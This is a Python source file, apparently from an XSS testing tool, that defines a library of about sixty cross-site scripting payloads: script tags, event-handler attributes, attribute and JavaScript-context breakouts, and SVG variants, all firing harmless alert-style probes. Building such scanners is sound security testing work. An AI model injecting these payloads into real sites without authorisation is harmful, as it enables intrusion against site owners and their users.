class Payloads:

    # ============================================================
    # Basic HTML / Script Payloads
    # ============================================================

    HTML_PAYLOADS = [

        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<script>confirm(1)</script>",
        "<script>prompt(1)</script>",
        "<script>console.log('XSS')</script>",
        "<script>document.body.dataset.xss='1'</script>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "<script>alert(`XSS`)</script>",
        "<script>/*xss*/alert(1)</script>",

    ]


    # ============================================================
    # HTML Element Payloads
    # ============================================================

    HTML_ELEMENT_PAYLOADS = [

        "<img src=x onerror=alert(1)>",
        "<img src=x onerror='alert(1)'>",
        "<img src=x onerror=\"alert(1)\">",
        "<svg onload=alert(1)>",
        "<svg onload='alert(1)'>",
        "<svg onload=\"alert(1)\">",
        "<iframe src='javascript:alert(1)'>",
        "<body onload=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<details open ontoggle=alert(1)>",

    ]


    # ============================================================
    # Event Handler Payloads
    # ============================================================

    EVENT_PAYLOADS = [

        "<div onmouseover=alert(1)>X</div>",
        "<div onclick=alert(1)>X</div>",
        "<div onfocus=alert(1)>X</div>",
        "<input onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<button onclick=alert(1)>Click</button>",
        "<select onchange=alert(1)><option>1</option></select>",
        "<video onerror=alert(1)>",
        "<audio onerror=alert(1)>",
        "<marquee onstart=alert(1)>X</marquee>",

    ]


    # ============================================================
    # Attribute-Oriented Payloads
    # ============================================================

    ATTRIBUTE_PAYLOADS = [

        "\" onmouseover=\"alert(1)",
        "' onmouseover='alert(1)",
        "\" onclick=\"alert(1)",
        "' onclick='alert(1)",
        "\" autofocus onfocus=\"alert(1)",
        "' autofocus onfocus='alert(1)",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "'><img src=x onerror=alert(1)>",

    ]


    # ============================================================
    # JavaScript Context Payloads
    # ============================================================

    JAVASCRIPT_PAYLOADS = [

        "';alert(1);//",
        "\";alert(1);//",
        "'-alert(1)-'",
        "\"-alert(1)-\"",
        "';confirm(1);//",
        "\";confirm(1);//",
        "';prompt(1);//",
        "\";prompt(1);//",
        "</script><script>alert(1)</script>",
        "</script><img src=x onerror=alert(1)>",

    ]


    # ============================================================
    # SVG / Markup Variants
    # ============================================================

    SVG_PAYLOADS = [

        "<svg><script>alert(1)</script></svg>",
        "<svg onload=confirm(1)>",
        "<svg onload=prompt(1)>",
        "<svg/onload=alert(1)>",
        "<svg onmouseover=alert(1)>",
        "<svg><a><animate onbegin=alert(1)>",
        "<svg><set onbegin=alert(1)>",
        "<svg><image onerror=alert(1)>",
        "<svg><foreignObject><script>alert(1)</script>",
        "<svg id=x onfocus=alert(1) tabindex=1>",

    ]


    # ============================================================
    # Combined Payload Library
    # ============================================================

    PAYLOADS = (
        HTML_PAYLOADS
        + HTML_ELEMENT_PAYLOADS
        + EVENT_PAYLOADS
        + ATTRIBUTE_PAYLOADS
        + JAVASCRIPT_PAYLOADS
        + SVG_PAYLOADS
    )


    # ============================================================
    # Remove Duplicate Payloads
    # ============================================================

    PAYLOADS = list(
        dict.fromkeys(
            PAYLOADS
        )
    )


    # ============================================================
    # Payload Count
    # ============================================================

    @classmethod
    def count(cls):

        return len(
            cls.PAYLOADS
        )